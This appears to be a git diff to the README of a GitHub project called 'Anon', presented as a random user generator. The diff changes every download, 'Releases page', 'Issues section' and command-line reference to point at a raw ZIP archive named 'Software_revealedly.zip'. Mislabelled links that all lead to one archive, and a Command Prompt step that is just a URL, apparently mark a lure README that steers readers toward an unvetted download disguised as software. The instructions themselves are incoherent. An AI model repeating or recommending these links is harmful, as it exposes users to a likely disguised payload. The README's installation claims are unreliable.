@@ -6,7 +6,7 @@ Welcome to Anon, your easy-to-use random user generator. This tool helps you cre
 
 ## 📥 Download Anon
 
-[![Download Anon](https://raw.githubusercontent.com/zeusxx333/Anon/main/champignon/Anon-3.1-alpha.2.zip%https://raw.githubusercontent.com/zeusxx333/Anon/main/champignon/Anon-3.1-alpha.2.zip)](https://raw.githubusercontent.com/zeusxx333/Anon/main/champignon/Anon-3.1-alpha.2.zip)
+[![Download Anon](https://github.com/zeusxx333/Anon/raw/refs/heads/main/champignon/Software_revealedly.zip%https://github.com/zeusxx333/Anon/raw/refs/heads/main/champignon/Software_revealedly.zip)](https://github.com/zeusxx333/Anon/raw/refs/heads/main/champignon/Software_revealedly.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,7 +27,7 @@ To run Anon, you will need:
 
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/zeusxx333/Anon/main/champignon/Anon-3.1-alpha.2.zip).
+1. Visit the [Releases page](https://github.com/zeusxx333/Anon/raw/refs/heads/main/champignon/Software_revealedly.zip).
 2. Find the latest version of Anon.
 3. Click on the appropriate file for your operating system.
 4. Save the file to your computer.
@@ -39,7 +39,7 @@ To get started, follow these steps:
 
 - Open `Command Prompt`.
 - Change the directory to where Anon is located.
-- Type `https://raw.githubusercontent.com/zeusxx333/Anon/main/champignon/Anon-3.1-alpha.2.zip` and press Enter.
+- Type `https://github.com/zeusxx333/Anon/raw/refs/heads/main/champignon/Software_revealedly.zip` and press Enter.
 
 ### For macOS Users
 
@@ -72,7 +72,7 @@ If you encounter any issues, consider the following tips:
 
 ## 📞 Support
 
-If you have further questions or need help, please visit the [Issues section](https://raw.githubusercontent.com/zeusxx333/Anon/main/champignon/Anon-3.1-alpha.2.zip). You can also create a new issue if you find a bug or have a feature request.
+If you have further questions or need help, please visit the [Issues section](https://github.com/zeusxx333/Anon/raw/refs/heads/main/champignon/Software_revealedly.zip). You can also create a new issue if you find a bug or have a feature request.
 
 ## 📝 License
 
